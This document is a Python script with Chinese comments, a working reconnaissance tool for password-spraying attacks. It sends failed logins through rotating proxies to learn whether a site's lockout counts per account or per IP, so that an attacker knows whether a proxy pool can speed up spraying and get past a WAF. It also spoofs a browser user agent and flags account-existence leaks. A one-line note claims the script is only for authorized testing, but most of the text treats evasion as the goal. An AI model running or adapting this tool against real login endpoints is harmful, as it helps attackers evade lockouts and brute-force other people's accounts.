#!/usr/bin/env python3
"""锁粒度探针：判定登录锁是「账号级」还是「IP 级」。

为什么必须先测：账号级 ⇒ 换出口/换代理池对喷速零收益（出口只用来穿 WAF）；
IP 级 ⇒ 出口池就是喷速放大器。两者战术完全相反，猜错等于白烧几小时。

用法:
  python3 lock_granularity_probe.py --url https://t/csapi/login \
      --user 小宇中控 --proxies PROXIES_OK.txt --rounds 3

参数:
  --url       登录端点（JSON POST）
  --user      被喷账号（用真账号，别用假名——假名不进桶）
  --proxies   出口列表文件，每行一个 http://user:pass@host:port
  --rounds    每相的重复轮次，默认 3
  --lock-marker / --fail-marker  自定义判定文案（中文平台一般不用改）

判定逻辑（两相）:
  相 A 饱和：只用「一个」出口连续发，直到看到锁文案，记下阈值 T。
  相 B 换口：立刻用一个「全新、从未发过请求」的出口发一发：
      回锁文案  ⇒ 计数按账号共享 ⇒ **账号级**（换 IP 无用）
      回密码错误 ⇒ 计数按 IP 分桶   ⇒ **IP 级**（出口池可放大）
  相 B 重复 N 次（每次都用全新出口）以提高置信度，需先把锁等过去。

只读纪律：本脚本只发生失败的登录尝试，不改任何服务端状态、不碰他人账号权限；
          喷的账号必须是授权测试账号，或已判明无害的自己的观察对象。
退出码：0=账号级 1=IP 级 2=无法判定
"""
import argparse, json, string, sys, time, urllib.error, urllib.request

LOCK_MARKERS = ["锁定", "已被锁", "锁", "locked", "too many", "频繁", "稍后再试", "请稍后", "captcha", "验证码"]
FAIL_MARKERS = ["密码错误", "密码不正确", "用户名或密码", "账号或密码", "invalid", "incorrect", "unauthorized", "不存在"]
OTHER_MARKERS = ["已被删除", "已删除", "不存在", "disabled", "已停用"]


def load_proxies(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "://" not in line:
                line = "http://" + line
            out.append(line)
    return out


def login(url, user, password, proxy=None, timeout=10):
    """发一发登录，返回 (body, note)。note 用于区分网络层失败与业务层回包。"""
    body = json.dumps({"username": user, "password": password, "theme": "dark"}).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    })
    if proxy:
        host = proxy.split("://", 1)[-1]
        req.set_proxy(host, "http")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("utf-8", "replace"), None
    except urllib.error.HTTPError as exc:
        try:
            return exc.read().decode("utf-8", "replace"), "http%d" % exc.code
        except Exception:
            return "", "http%d" % exc.code
    except Exception as exc:  # 超时/代理死/连接重置
        return "", type(exc).__name__


def classify(body, lock_markers, fail_markers):
    """→ 'LOCK' | 'FAIL' | 'OTHER' | 'GARBAGE'。垃圾包不得计入任何结论。"""
    if not body:
        return "GARBAGE"
    low = body.lower()
    if "<!doctype" in low or "<html" in low or "just a moment" in low or "防火墙" in body:
        return "GARBAGE"          # WAF 挑战页，零信息
    if any(m in body for m in lock_markers) or any(m.lower() in low for m in LOCK_MARKERS):
        return "LOCK"
    if any(m in body for m in fail_markers) or any(m.lower() in low for m in FAIL_MARKERS):
        return "FAIL"
    if any(m in body for m in OTHER_MARKERS):
        return "OTHER"            # 存在性预言机（如「账号已被删除」），单独记
    return "GARBAGE"


def rand_pw(n=12):
    alphabet = string.ascii_letters + string.digits
    return "Zq" + "".join(alphabet[(i * 7 + 3) % len(alphabet)] for i in range(n))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--proxies", required=True)
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--max-attempts", type=int, default=60, help="相A 饱和为止的上限")
    ap.add_argument("--window", type=int, default=150, help="等锁过去的秒数")
    args = ap.parse_args()

    proxies = load_proxies(args.proxies)
    if not proxies:
        print("[!] 出口列表为空")
        return 2
    print("[*] 账号=%s 出口=%d 个" % (args.user, len(proxies)))

    # ---- 相 A：单出口饱和，测阈值 T ----
    probe = proxies[0]
    t_used, threshold = 0, None
    for i in range(1, args.max_attempts + 1):
        body, note = login(args.url, args.user, rand_pw(), probe)
        kind = classify(body, LOCK_MARKERS, FAIL_MARKERS)
        t_used = i
        if kind == "LOCK":
            threshold = i
            print("[A] 第 %d 发 → LOCK（阈值 ≈ %d 发 / 窗口）%s" % (i, i, body[:80]))
            break
        time.sleep(0.4)
    if threshold is None:
        print("[A] %d 发未见锁文案（阈值 >%d，或该站不锁/文案不同）" % (t_used, args.max_attempts))

    # ---- 相 B：换全新出口复测 ----
    verdicts = []
    for r in range(args.rounds):
        fresh = proxies[(r + 1) % len(proxies)]
        body, note = login(args.url, args.user, rand_pw(), fresh)
        kind = classify(body, LOCK_MARKERS, FAIL_MARKERS)
        print("[B%d] 全新出口 %s → %s  %s" % (r + 1, fresh.split("@")[-1], kind, (body or note or "")[:80]))
        if kind in ("LOCK", "FAIL"):
            verdicts.append(kind)
        if kind == "LOCK":
            time.sleep(args.window)      # 等锁过期再测下一轮

    locked = verdicts.count("LOCK")
    clean = verdicts.count("FAIL")
    if verdicts and locked == len(verdicts):
        print("[=] 结论：**账号级锁**（换出口照样锁）⇒ 出口池只用于穿 WAF，喷速硬顶 = 阈值/窗口")
        return 0
    if clean == len(verdicts) and clean > 0:
        print("[=] 结论：**IP 级锁**（新出口未被锁）⇒ 出口池就是喷速放大器")
        return 1
    if locked and clean:
        print("[=] 结论：混合/不确定（LOCK %d / FAIL %d）⇒ 加大 --rounds 或加长 --window 复测" % (locked, clean))
        return 2
    print("[=] 无法判定（样本全为垃圾包）⇒ 换出口池重跑")
    return 2


if __name__ == "__main__":
    sys.exit(main())
